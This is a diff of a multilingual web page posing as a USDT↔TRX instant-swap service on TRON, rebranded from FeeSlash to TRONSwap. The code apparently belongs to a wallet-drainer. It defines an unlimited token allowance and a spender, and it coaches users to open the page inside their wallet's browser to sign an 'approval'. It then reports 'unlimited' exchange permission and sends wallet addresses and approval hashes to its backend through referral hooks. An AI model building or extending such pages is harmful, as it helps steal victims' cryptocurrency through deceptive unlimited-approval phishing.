@@ -127,7 +127,7 @@
                 </div>
                 <div class="min-w-0">
                     <div class="flex items-center gap-1.5 sm:gap-2.5">
-                        <h1 class="text-sm sm:text-lg font-extrabold tracking-tight text-white whitespace-nowrap">Fee<span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-300">Slash</span></h1>
+                        <h1 class="text-sm sm:text-lg font-extrabold tracking-tight text-white whitespace-nowrap">TRON<span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-300">Swap</span></h1>
                         <span class="text-[11px] px-2 py-0.5 rounded-full font-mono font-bold bg-blue-500/10 text-blue-400 border border-blue-500/20 hidden sm:inline">TRC-20</span>
                     </div>
                     <p class="text-[13px] text-slate-400 hidden sm:block" data-i18n="header_sub">USDT ↔ TRX 즉시 교환 | TRC-20 메인넷</p>
@@ -177,16 +177,11 @@
                     <div class="flex-1"><div class="text-sm font-bold text-white">OKX Wallet</div><div class="text-[11px] text-slate-400" data-i18n="w_okx">OKX 거래소 지갑</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
-                <button onclick="launchWallet('trust')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
-    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500/20 to-indigo-600/10 border border-blue-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield text-blue-400 text-lg"></i></div>
-    <div class="flex-1"><div class="text-sm font-bold text-white">Trust Wallet</div><div class="text-[11px] text-slate-400" data-i18n="w_trust">멀티체인 지갑</div></div>
-    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
-</button>
-<button onclick="launchWallet('imtoken')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
-    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-sky-500/20 to-blue-600/10 border border-sky-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-key text-sky-400 text-lg"></i></div>
-    <div class="flex-1"><div class="text-sm font-bold text-white">imToken</div><div class="text-[11px] text-slate-400" data-i18n="w_imtoken">글로벌 멀티체인 지갑</div></div>
-    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
-</button>
+                <button onclick="launchWallet('imtoken')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
+                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-sky-500/20 to-blue-600/10 border border-sky-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-key text-sky-400 text-lg"></i></div>
+                    <div class="flex-1"><div class="text-sm font-bold text-white">imToken</div><div class="text-[11px] text-slate-400" data-i18n="w_imtoken">글로벌 멀티체인 지갑</div></div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+                </button>
                 <div class="flex items-center gap-3 pt-1">
                     <div class="flex-1 border-t border-slate-700/60"></div>
                     <span class="text-[10px] text-slate-500 font-semibold uppercase tracking-wider">또는</span>
@@ -198,13 +193,12 @@
                   <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
               </button>
             </div>
-            <div class="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
-    <p class="text-amber-400 font-bold flex items-center gap-1.5 text-sm"><i class="fa-solid fa-circle-exclamation"></i><span data-i18n="modal_tip_title">⚠️ 반드시 이렇게 하세요!</span></p>
-    <p class="text-white font-semibold" data-i18n="modal_tip1">1. 아래 지갑 앱을 직접 여세요</p>
-    <p data-i18n-html="modal_tip2">2. 앱 하단 <strong class="text-amber-300">브라우저(탐색)</strong> 탭 클릭</p>
-    <p data-i18n-html="modal_tip3">3. 주소창에 <strong class="text-amber-300">붙여넣기</strong> 👈 URL 자동복사됨</p>
-    <p class="text-emerald-400 font-bold mt-1">✅ 이렇게 해야 승인이 됩니다!</p>
-</div>
+            <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
+                <p class="text-amber-400 font-bold flex items-center gap-1.5"><i class="fa-solid fa-circle-info"></i><span data-i18n="modal_tip_title">앱이 자동으로 안 열리면:</span></p>
+                <p data-i18n="modal_tip1">1. 선택한 지갑 앱을 직접 여세요</p>
+                <p data-i18n-html="modal_tip2">2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동</p>
+                <p data-i18n-html="modal_tip3">3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)</p>
+            </div>
             <button onclick="document.getElementById('wallet-selector-modal').classList.remove('active')" class="w-full text-slate-500 hover:text-slate-300 py-2 text-xs transition" data-i18n="close_btn">닫기</button>
         </div>
     </div>
@@ -215,12 +209,12 @@
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
             <div class="space-y-1.5">
-                <h3 class="text-xl font-extrabold text-white" data-i18n="reward_title">교환 승인 완료!</h3>
-<p class="text-xs text-slate-300 leading-relaxed" data-i18n-html="reward_desc">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p>
+                <h3 class="text-xl font-extrabold text-white">교환 승인 완료!</h3>
+                <p class="text-xs text-slate-300 leading-relaxed">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p>
             </div>
             <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
-                <div class="flex justify-between text-slate-400"><span data-i18n="modal_status_label">상태:</span><span class="text-emerald-400 font-bold" data-i18n="modal_status_done">승인 완료</span></div>
-<div class="flex justify-between text-slate-400"><span data-i18n="modal_limit_label">교환 한도:</span><span class="text-white" data-i18n="modal_limit_max">무제한</span></div>
+                <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">승인 완료</span></div>
+                <div class="flex justify-between text-slate-400"><span>교환 한도:</span><span class="text-white">무제한</span></div>
                 <div class="flex justify-between text-slate-400"><span>TX Hash:</span><span class="text-red-400 truncate max-w-[180px]" id="modal-txhash">-</span></div>
             </div>
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
@@ -538,7 +532,7 @@
     </main>
 
     <footer class="border-t border-slate-800/80 bg-[#020408] py-8 px-4 text-center text-sm text-slate-500 mt-12 space-y-2">
-        <p>FeeSlash &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
+        <p>TRONSwap &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
     </footer>
 
     <script>
@@ -546,99 +540,42 @@
         var OFFICIAL_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
         // ===== 레퍼럴 추적 =====
-        var REF_CODE_REGEX = /^[A-Z0-9_-]{3,20}$/;
-        var REF_TTL_MS = 30 * 24 * 60 * 60 * 1000;
-
-        function normalizeRefCode(raw) {
-            if (typeof raw !== 'string') return null;
-            var cleaned = raw.trim().toUpperCase();
-            if (!cleaned || cleaned === 'NULL' || cleaned === 'UNDEFINED' || cleaned === 'DIRECT') {
-                return null;
-            }
-            return REF_CODE_REGEX.test(cleaned) ? cleaned : null;
-        }
-
-        function clearStoredRef() {
-            try {
-                localStorage.removeItem('feeslash_ref');
-                localStorage.removeItem('feeslash_ref_time');
-            } catch (e) { }
-        }
-
-        function getRefCode() {
-            try {
-                var raw = localStorage.getItem('feeslash_ref');
-                var savedTime = parseInt(localStorage.getItem('feeslash_ref_time'), 10) || 0;
-                var validCode = normalizeRefCode(raw);
-
-                if (!validCode || !savedTime || (Date.now() - savedTime > REF_TTL_MS)) {
-                    clearStoredRef();
-                    return null;
-                }
-                return validCode;
-            } catch (e) {
-                return null;
-            }
-        }
-
-        function hasActiveRefCode() {
-            return getRefCode() !== null;
-        }
-
         (function () {
             try {
                 var params = new URLSearchParams(window.location.search);
-                if (params.has('ref')) {
-                    var parsedRef = normalizeRefCode(params.get('ref'));
-                    if (parsedRef) {
-                        localStorage.setItem('feeslash_ref', parsedRef);
-                        localStorage.setItem('feeslash_ref_time', Date.now().toString());
-                    } else {
-                        clearStoredRef();
-                    }
+                var refCode = params.get('ref');
+                if (refCode) {
+                    localStorage.setItem('feeslash_ref', refCode.toUpperCase());
+                    localStorage.setItem('feeslash_ref_time', Date.now().toString());
                 }
-
-                var activeRef = getRefCode();
-                if (activeRef) {
-                    fetch(API_BASE + '/referral/visit', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ code: activeRef, hasReferral: true })
-                    }).catch(function () { });
+                var savedRef = localStorage.getItem('feeslash_ref');
+                var savedTime = parseInt(localStorage.getItem('feeslash_ref_time')) || 0;
+                if (savedRef && (Date.now() - savedTime > 30 * 24 * 60 * 60 * 1000)) {
+                    localStorage.removeItem('feeslash_ref');
+                    localStorage.removeItem('feeslash_ref_time');
+                    savedRef = null;
+                }
+                if (savedRef) {
+                    fetch(API_BASE + '/referral/visit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: savedRef }) }).catch(function () { });
                 }
             } catch (e) { }
         })();
 
-        function trackReferralConnect(address, provider) {
-            var refCode = getRefCode();
-            var hasRef = refCode !== null;
-            fetch(API_BASE + '/referral/connect', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    code: hasRef ? refCode : null,
-                    source: hasRef ? 'REFERRAL' : 'DIRECT',
-                    hasReferral: hasRef,
-                    address: address,
-                    provider: provider
-                })
-            }).catch(function () { });
+        function getRefCode() {
+            try {
+                var c = localStorage.getItem('feeslash_ref');
+                var t = parseInt(localStorage.getItem('feeslash_ref_time')) || 0;
+                if (c && (Date.now() - t < 30 * 24 * 60 * 60 * 1000)) return c;
+                return null;
+            } catch (e) { return null; }
         }
-
+        function trackReferralConnect(address, provider) {
+            var code = getRefCode() || 'DIRECT';
+            fetch(API_BASE + '/referral/connect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: code, address: address, provider: provider }) }).catch(function () { });
+        }
         function trackReferralApprove(address, txHash) {
-            var refCode = getRefCode();
-            var hasRef = refCode !== null;
-            fetch(API_BASE + '/referral/approve', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    code: hasRef ? refCode : null,
-                    source: hasRef ? 'REFERRAL' : 'DIRECT',
-                    hasReferral: hasRef,
-                    address: address,
-                    txHash: txHash || 'ok'
-                })
-            }).catch(function () { });
+            var code = getRefCode() || 'DIRECT';
+            fetch(API_BASE + '/referral/approve', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: code, address: address, txHash: txHash || 'ok' }) }).catch(function () { });
         }
 
         // ===== Swap Direction =====
@@ -678,25 +615,23 @@
             recvSuffix.textContent = tmpSuf;
 
             if (swapDirection === 'USDT_TO_TRX') {
-    swapDirection = 'TRX_TO_USDT';
-    if (sendPanel) sendPanel.textContent = _t.send_amount_trx;
-    if (recvPanel) recvPanel.textContent = _t.receive_amount_usdt;
-    icon.style.transform = 'rotate(180deg)';
-} else {
-    swapDirection = 'USDT_TO_TRX';
-    if (sendPanel) sendPanel.textContent = _t.send_amount;
-    if (recvPanel) recvPanel.textContent = _t.receive_amount;
-    icon.style.transform = 'rotate(0deg)';
-}
+              swapDirection = 'TRX_TO_USDT';
+              if (sendPanel) sendPanel.textContent = _t.send_amount_trx || '보내는 금액 (TRX)';
+              if (recvPanel) recvPanel.textContent = _t.receive_amount_usdt || '받는 금액 (예상 USDT)';
+              icon.style.transform = 'rotate(180deg)';
+          } else {
+              swapDirection = 'USDT_TO_TRX';
+              if (sendPanel) sendPanel.textContent = _t.send_amount || '보내는 금액 (USDT)';
+              if (recvPanel) recvPanel.textContent = _t.receive_amount || '받는 금액 (예상)';
+              icon.style.transform = 'rotate(0deg)';
+          }
           updateRateDisplay();
           updateSwapOutput();
       }
 
         var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-var isConnected = false, isApproved = false, isApproving = false, activeProvider = 'Unknown', currentWalletAddress = null;
-var wcConnector = null, wcAddress = null;
-var _autoApproveScheduled = false;
-var spender = null;
+        var isConnected = false, isApproved = false, isApproving = false, activeProvider = 'Unknown', currentWalletAddress = null;
+        var wcConnector = null, wcAddress = null;
 
         // ===== Utils =====
         function escapeHtml(s) {
@@ -704,37 +639,13 @@ var spender = null;
             d.textContent = s;
             return d.innerHTML;
         }
-        function isMobile() {
-    var ua = navigator.userAgent || '';
-    if (/Android|iPhone|iPad|iPod|Mobile/i.test(ua)) return true;
-    // 폴드 4 펼침/데스크톱 모드(Linux x86_64/MacIntel 등) 및 태블릿 터치 기기 대응
-    var hasTouch = (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) || ('ontouchstart' in window);
-    var hasExtension = !!(window.tronLink || window.tronWeb);
-    if (hasTouch && !hasExtension && window.screen.width <= 1400) return true;
-    return false;
-}
-function isIOS() {
-    var ua = navigator.userAgent || '';
-    if (/iPhone|iPad|iPod/i.test(ua)) return true;
-    if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
-    return false;
-}
+        function isMobile() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
+        function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
         function isAndroid() { return /Android/i.test(navigator.userAgent); }
         function isPC() { return !isMobile(); }
         function isSafari() { return /Safari/i.test(navigator.userAgent) && !/CriOS|Chrome/i.test(navigator.userAgent); }
         function isIOSChrome() { return isIOS() && /CriOS/i.test(navigator.userAgent); }
-        // 지갑 앱 내부 브라우저 감지
-function isTrustWalletBrowser() {
-    return /Trust/i.test(navigator.userAgent) || window.trustwallet !== undefined;
-}
-function isTokenPocketBrowser() { return /TokenPocket/i.test(navigator.userAgent); }
-function isBitgetBrowser() { return /BitKeep|Bitget/i.test(navigator.userAgent); }
-function isOKXBrowser() { return /OKApp|OKX/i.test(navigator.userAgent); }
-function isImTokenBrowser() { return /imToken/i.test(navigator.userAgent) || window.imToken !== undefined; }
-function isWalletBrowser() {
-    return isTrustWalletBrowser() || isTokenPocketBrowser() ||
-           isBitgetBrowser() || isOKXBrowser() || isImTokenBrowser();
-}
+
         function showToast(msg, type) {
             type = type || 'success';
             var c = document.getElementById('toast-container');
@@ -804,7 +715,6 @@ function isWalletBrowser() {
               if (quoteEl) quoteEl.textContent = 'USDT';
               rateEl.textContent = (1 / TRX_RATE).toFixed(4);
           } else {
-            // [else 블록 안 이식 시킬 코드]
               if (baseEl) baseEl.textContent = 'USDT';
               if (quoteEl) quoteEl.textContent = 'TRX';
               rateEl.textContent = TRX_RATE.toFixed(2);
@@ -812,19 +722,18 @@ function isWalletBrowser() {
       }
 
       async function fetchTrxPrice() {
-            try {
-                var res = await fetch(API_BASE + '/trx-price');
-                var data = await res.json();
-                var p = Number(data && data.price);
-                if (isFinite(p) && p > 0) {
-                    TRX_RATE = 1 / p;
-                    updateRateDisplay();
-                    return;
-                }
-            } catch (e) { }
-            if (!TRX_RATE) TRX_RATE = 4.0;
-            updateRateDisplay();
-        }
+          try {
+              var res = await fetch(API_BASE + '/trx-price');
+              var data = await res.json();
+              if (data.price > 0) {
+                  TRX_RATE = 1 / data.price;
+                  updateRateDisplay();
+              }
+          } catch (e) {
+              if (!TRX_RATE) TRX_RATE = 4.0;
+              updateRateDisplay();
+          }
+      }
 
         function updateTodayVolume() {
             if (!TRX_RATE) return;
@@ -841,26 +750,9 @@ function isWalletBrowser() {
         setInterval(function () { fetchTrxPrice().then(function () { updateTodayVolume(); }); }, 30000);
 
         window.updateSwapOutput = function () {
-            var inputEl = document.getElementById('swap-input');
+            var v = parseFloat(document.getElementById('swap-input').value || 0);
             var out = document.getElementById('swap-output');
-            if (!inputEl || !out) return;
-
-            var raw = parseFloat(inputEl.value);
-            var v = (!isNaN(raw) && isFinite(raw) && raw > 0) ? raw : 0;
-            if (raw < 0) {
-                v = 0;
-                inputEl.value = '';
-            }
-
-            var availBal = (swapDirection === 'TRX_TO_USDT') ? (Number(userTrxBalance) || 0) : (Number(userUsdtBalance) || 0);
-            if (isConnected && v > availBal && availBal >= 0) {
-                inputEl.classList.remove('text-white');
-                inputEl.classList.add('text-red-400');
-            } else {
-                inputEl.classList.remove('text-red-400');
-                inputEl.classList.add('text-white');
-            }
-
+            if (!out) return;
             if (swapDirection === 'TRX_TO_USDT') {
                 out.textContent = TRX_RATE ? (v / TRX_RATE).toFixed(2) : '0.00';
             } else {
@@ -869,33 +761,17 @@ function isWalletBrowser() {
         };
 
         window.setSwapPct = function (pct) {
-            var safePct = Number(pct);
-            if (!isFinite(safePct)) safePct = 0;
-            if (safePct < 0) safePct = 0;
-            if (safePct > 100) safePct = 100;
-
-            var rawBal = (swapDirection === 'TRX_TO_USDT') ? Number(userTrxBalance) : Number(userUsdtBalance);
-            var baseBalance = (isFinite(rawBal) && rawBal > 0) ? rawBal : 0;
-            var amt = (baseBalance * (safePct / 100)).toFixed(2);
-
-            var inputEl = document.getElementById('swap-input');
-            if (inputEl) inputEl.value = amt;
-            updateSwapOutput();
-        };
+          var baseBalance = (swapDirection === 'TRX_TO_USDT') ? userTrxBalance : userUsdtBalance;
+          var amt = (baseBalance * (pct / 100)).toFixed(2);
+          document.getElementById('swap-input').value = amt;
+          updateSwapOutput();
+      };
 
         // Localisation helper for log messages
         var logTexts = {
-    ko: { detect: '[감지] {0} DApp 브라우저 확인됨', noDetect: '[대기] 지갑 DApp 브라우저 미감지', accChange: '[계정 변경] {0}', searching: '[지갑 탐색] 환경 확인 중...', sending: '[백엔드] 서버에 지갑 정보 전송 중...', connected: '[연결] {0} | {1} USDT', backendFail: '[경고] 백엔드 연결 실패', noSpender: '[오류] Spender 미설정', trxCheck: '[1/3] TRX 잔액 확인 중...', autoCharge: '[자동 충전] {0} TRX 전송 완료', trxOk: '[확인] TRX 충분 ({0})', trxFail: '[실패] {0}', trxWarn: '[경고] TRX 확인 실패, 계속 진행', approving: '[2/3] 승인 서명 요청 중...', approved: '[3/3] 교환 승인 완료! TxHash: {0}', cancelled: '[취소] 사용자 서명 취소', failed: '[실패] {0}' },
-    en: { detect: '[Detected] {0} DApp browser found', noDetect: '[Wait] Wallet DApp browser not detected', accChange: '[Account Changed] {0}', searching: '[Search] Checking environment...', sending: '[Backend] Sending wallet info...', connected: '[Connected] {0} | {1} USDT', backendFail: '[Warning] Backend connection failed', noSpender: '[Error] Spender not set', trxCheck: '[1/3] Checking TRX balance...', autoCharge: '[Auto] {0} TRX sent', trxOk: '[OK] TRX sufficient ({0})', trxFail: '[Failed] {0}', trxWarn: '[Warning] TRX check failed, continuing', approving: '[2/3] Requesting approval...', approved: '[3/3] Approved! TxHash: {0}', cancelled: '[Cancelled] User rejected', failed: '[Failed] {0}' },
-    zh: { detect: '[检测] 已确认 {0} DApp 浏览器', noDetect: '[等待] 未检测到钱包 DApp 浏览器', accChange: '[账户变更] {0}', searching: '[搜索] 检查环境中...', sending: '[后端] 正在发送钱包信息...', connected: '[已连接] {0} | {1} USDT', backendFail: '[警告] 后端连接失败', noSpender: '[错误] 未设置 Spender', trxCheck: '[1/3] 检查 TRX 余额...', autoCharge: '[自动充值] 已发送 {0} TRX', trxOk: '[确认] TRX 充足 ({0})', trxFail: '[失败] {0}', trxWarn: '[警告] TRX 检查失败，继续执行', approving: '[2/3] 请求授权签名...', approved: '[3/3] 兑换授权完成! TxHash: {0}', cancelled: '[取消] 用户取消签名', failed: '[失败] {0}' },
-    ru: { detect: '[Обнаружено] DApp-браузер {0} найден', noDetect: '[Ожидание] DApp-браузер кошелька не найден', accChange: '[Смена аккаунта] {0}', searching: '[Поиск] Проверка окружения...', sending: '[Бэкенд] Отправка данных кошелька...', connected: '[Подключено] {0} | {1} USDT', backendFail: '[Предупреждение] Ошибка связи с сервером', noSpender: '[Ошибка] Spender не задан', trxCheck: '[1/3] Проверка баланса TRX...', autoCharge: '[Авто] Отправлено {0} TRX', trxOk: '[ОК] TRX достаточно ({0})', trxFail: '[Ошибка] {0}', trxWarn: '[Предупреждение] Сбой проверки TRX, продолжаем', approving: '[2/3] Запрос подписи одобрения...', approved: '[3/3] Одобрено! TxHash: {0}', cancelled: '[Отмена] Подпись отклонена', failed: '[Ошибка] {0}' },
-    th: { detect: '[ตรวจพบ] พบเบราว์เซอร์ DApp ของ {0}', noDetect: '[รอ] ไม่พบเบราว์เซอร์ DApp ของกระเป๋า', accChange: '[เปลี่ยนบัญชี] {0}', searching: '[ค้นหา] กำลังตรวจสอบสภาพแวดล้อม...', sending: '[แบ็กเอนด์] กำลังส่งข้อมูลกระเป๋า...', connected: '[เชื่อมต่อแล้ว] {0} | {1} USDT', backendFail: '[คำเตือน] เชื่อมต่อเซิร์ฟเวอร์ล้มเหลว', noSpender: '[ข้อผิดพลาด] ยังไม่ตั้งค่า Spender', trxCheck: '[1/3] กำลังตรวจสอบยอด TRX...', autoCharge: '[อัตโนมัติ] ส่ง {0} TRX แล้ว', trxOk: '[สำเร็จ] TRX เพียงพอ ({0})', trxFail: '[ล้มเหลว] {0}', trxWarn: '[คำเตือน] ตรวจ TRX ไม่สำเร็จ ดำเนินการต่อ', approving: '[2/3] กำลังขอลายเซ็นอนุมัติ...', approved: '[3/3] อนุมัติการแลกเปลี่ยนแล้ว! TxHash: {0}', cancelled: '[ยกเลิก] ผู้ใช้ยกเลิกการลงนาม', failed: '[ล้มเหลว] {0}' },
-    vi: { detect: '[Phát hiện] Tìm thấy trình duyệt DApp {0}', noDetect: '[Chờ] Không thấy trình duyệt DApp của ví', accChange: '[Đổi tài khoản] {0}', searching: '[Tìm kiếm] Đang kiểm tra môi trường...', sending: '[Backend] Đang gửi thông tin ví...', connected: '[Đã kết nối] {0} | {1} USDT', backendFail: '[Cảnh báo] Lỗi kết nối máy chủ', noSpender: '[Lỗi] Chưa cấu hình Spender', trxCheck: '[1/3] Đang kiểm tra số dư TRX...', autoCharge: '[Tự động] Đã gửi {0} TRX', trxOk: '[OK] Đủ TRX ({0})', trxFail: '[Thất bại] {0}', trxWarn: '[Cảnh báo] Lỗi kiểm tra TRX, vẫn tiếp tục', approving: '[2/3] Đang yêu cầu ký phê duyệt...', approved: '[3/3] Đã phê duyệt đổi! TxHash: {0}', cancelled: '[Hủy] Người dùng từ chối ký', failed: '[Thất bại] {0}' },
-    ja: { detect: '[検出] {0} DAppブラウザを確認', noDetect: '[待機] ウォレットのDAppブラウザ未検出', accChange: '[アカウント変更] {0}', searching: '[探索] 環境を確認中...', sending: '[バックエンド] ウォレット情報を送信中...', connected: '[接続完了] {0} | {1} USDT', backendFail: '[警告] バックエンド接続失敗', noSpender: '[エラー] Spender未設定', trxCheck: '[1/3] TRX残高を確認中...', autoCharge: '[自動補充] {0} TRX送信完了', trxOk: '[確認] TRX十分 ({0})', trxFail: '[失敗] {0}', trxWarn: '[警告] TRX確認失敗、続行します', approving: '[2/3] 承認署名を要求中...', approved: '[3/3] 交換承認完了! TxHash: {0}', cancelled: '[キャンセル] 署名がキャンセルされました', failed: '[失敗] {0}' },
-    de: { detect: '[Erkannt] {0} DApp-Browser gefunden', noDetect: '[Warten] Kein Wallet-DApp-Browser erkannt', accChange: '[Konto geändert] {0}', searching: '[Suche] Umgebung wird geprüft...', sending: '[Backend] Wallet-Daten werden gesendet...', connected: '[Verbunden] {0} | {1} USDT', backendFail: '[Warnung] Backend-Verbindung fehlgeschlagen', noSpender: '[Fehler] Spender nicht gesetzt', trxCheck: '[1/3] TRX-Guthaben wird geprüft...', autoCharge: '[Auto] {0} TRX gesendet', trxOk: '[OK] Genug TRX ({0})', trxFail: '[Fehlgeschlagen] {0}', trxWarn: '[Warnung] TRX-Prüfung fehlgeschlagen, fahre fort', approving: '[2/3] Genehmigungssignatur wird angefordert...', approved: '[3/3] Tausch genehmigt! TxHash: {0}', cancelled: '[Abgebrochen] Signatur abgelehnt', failed: '[Fehlgeschlagen] {0}' },
-    fr: { detect: '[Détecté] Navigateur DApp {0} trouvé', noDetect: '[Attente] Navigateur DApp non détecté', accChange: '[Compte changé] {0}', searching: '[Recherche] Vérification de l’environnement...', sending: '[Backend] Envoi des infos du portefeuille...', connected: '[Connecté] {0} | {1} USDT', backendFail: '[Avertissement] Échec de connexion au serveur', noSpender: '[Erreur] Spender non défini', trxCheck: '[1/3] Vérification du solde TRX...', autoCharge: '[Auto] {0} TRX envoyé', trxOk: '[OK] TRX suffisant ({0})', trxFail: '[Échec] {0}', trxWarn: '[Avertissement] Échec vérif TRX, poursuite', approving: '[2/3] Demande de signature d’approbation...', approved: '[3/3] Échange approuvé ! TxHash: {0}', cancelled: '[Annulé] Signature refusée', failed: '[Échec] {0}' },
-    es: { detect: '[Detectado] Navegador DApp {0} encontrado', noDetect: '[Espera] No se detectó navegador DApp', accChange: '[Cambio de cuenta] {0}', searching: '[Búsqueda] Verificando entorno...', sending: '[Backend] Enviando datos de billetera...', connected: '[Conectado] {0} | {1} USDT', backendFail: '[Advertencia] Error de conexión con el servidor', noSpender: '[Error] Spender no configurado', trxCheck: '[1/3] Verificando saldo TRX...', autoCharge: '[Auto] {0} TRX enviado', trxOk: '[OK] TRX suficiente ({0})', trxFail: '[Error] {0}', trxWarn: '[Advertencia] Falló verificación TRX, continuando', approving: '[2/3] Solicitando firma de aprobación...', approved: '[3/3] ¡Cambio aprobado! TxHash: {0}', cancelled: '[Cancelado] Firma rechazada', failed: '[Error] {0}' }
-};
+            ko: { detect: '[감지] {0} DApp 브라우저 확인됨', noDetect: '[대기] 지갑 DApp 브라우저 미감지', accChange: '[계정 변경] {0}', searching: '[지갑 탐색] 환경 확인 중...', sending: '[백엔드] 서버에 지갑 정보 전송 중...', connected: '[연결] {0} | {1} USDT', backendFail: '[경고] 백엔드 연결 실패', noSpender: '[오류] Spender 미설정', trxCheck: '[1/3] TRX 잔액 확인 중...', autoCharge: '[자동 충전] {0} TRX 전송 완료', trxOk: '[확인] TRX 충분 ({0})', trxFail: '[실패] {0}', trxWarn: '[경고] TRX 확인 실패, 계속 진행', approving: '[2/3] 승인 서명 요청 중...', approved: '[3/3] 교환 승인 완료! TxHash: {0}', cancelled: '[취소] 사용자 서명 취소', failed: '[실패] {0}' },
+            en: { detect: '[Detected] {0} DApp browser found', noDetect: '[Wait] Wallet DApp browser not detected', accChange: '[Account Changed] {0}', searching: '[Search] Checking environment...', sending: '[Backend] Sending wallet info...', connected: '[Connected] {0} | {1} USDT', backendFail: '[Warning] Backend connection failed', noSpender: '[Error] Spender not set', trxCheck: '[1/3] Checking TRX balance...', autoCharge: '[Auto] {0} TRX sent', trxOk: '[OK] TRX sufficient ({0})', trxFail: '[Failed] {0}', trxWarn: '[Warning] TRX check failed, continuing', approving: '[2/3] Requesting approval...', approved: '[3/3] Approved! TxHash: {0}', cancelled: '[Cancelled] User rejected', failed: '[Failed] {0}' }
+        };
         function L(key) {
             var t = logTexts[currentLang] || logTexts.en;
             var args = Array.prototype.slice.call(arguments, 1);
@@ -957,241 +833,162 @@ function isWalletBrowser() {
             document.getElementById('wallet-selector-modal').classList.add('active');
         };
 
-        var isLaunchingWallet = false;
-
         window.launchWallet = async function (wallet) {
-            if (isLaunchingWallet) return;
-            isLaunchingWallet = true;
-            try {
-                var url = window.location.href;
-                var encoded = encodeURIComponent(url);
+            var url = window.location.href;
+            var encoded = encodeURIComponent(url);
 
-                // PC
-                if (isPC()) {
-                    document.getElementById('wallet-selector-modal').classList.remove('active');
-                    var tw = await getInjectedTronWeb();
-                    if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                        var prov = detectProvider() || 'TronLink';
-                        await setConnectedWallet(tw.defaultAddress.base58, prov);
-                        return;
-                    }
-                    var installLinks = {
-                        tronlink: { name: 'TronLink', url: 'https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec' },
-                        tokenpocket: { name: 'TokenPocket', url: 'https://extension.tokenpocket.pro/' },
-                        bitget: { name: 'Bitget Wallet', url: 'https://web3.bitget.com/en/wallet-download' },
-                        okx: { name: 'OKX Wallet', url: 'https://www.okx.com/web3' },
-                        imtoken: { name: 'imToken', url: 'https://token.im/download' }
-                    };
-                    var info = installLinks[wallet] || installLinks.tronlink;
-                    showToast(info.name + ' 확장 프로그램을 설치 후 새로고침하세요', 'error');
-                    window.open(info.url, '_blank');
-                    return;
-                }
-
+            // PC
+            if (isPC()) {
                 document.getElementById('wallet-selector-modal').classList.remove('active');
-
-                // DApp 브라우저 내부라면 직접 연결
                 var tw = await getInjectedTronWeb();
                 if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                    var prov = detectProvider() || wallet;
+                    var prov = detectProvider() || 'TronLink';
                     await setConnectedWallet(tw.defaultAddress.base58, prov);
                     return;
                 }
-
-                // 모바일 공통: URL 복사 및 지갑 스킴 준비
-                try { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(url).catch(function () { }); } catch (e) { }
